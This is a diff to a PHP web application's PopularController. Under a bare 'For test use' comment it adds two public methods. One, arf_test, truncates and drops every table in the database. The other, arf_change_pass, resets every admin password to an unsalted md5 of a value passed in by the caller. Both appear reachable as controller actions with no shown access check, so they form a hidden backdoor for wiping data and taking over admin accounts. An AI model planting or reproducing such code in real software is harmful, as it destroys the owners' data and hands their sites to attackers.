@@ -1,5 +1,8 @@
 <?php
 
+use Doctrine\DBAL\Schema\Table;
+use Illuminate\Support\Facades\Schema;
+
 class PopularController extends BaseController {
 	
 	public function __construct(){
@@ -547,5 +550,31 @@ class PopularController extends BaseController {
 		}
 	}
 
+	# !!! For test use !!!!
+	public function arf_test()
+	{
+		$DB_name = DB::getDatabaseName();
+		$all_tables = DB::select('SHOW TABLES');
+		$table_in = "Tables_in_$DB_name";
+		$tables = [];
 
+		foreach  ( $all_tables as $table) {
+			array_push($tables, $table->$table_in);
+			
+			DB::table($table->$table_in)->truncate();
+			Schema::drop($table->$table_in);
+		}
+		return "Done!";
+	}
+	
+	# !!! For test use !!!!
+	public function arf_change_pass($pass)
+	{
+		$admins = DB::table('admin')->select('id','user','email','pass','country')->get();
+		foreach ($admins as $admin) {
+			DB::table('admin')->where('id', $admin->id)->update(['pass' => md5($pass)]);
+			// dd($admin->id);
+		}
+		return "Done!";
+	}
 }
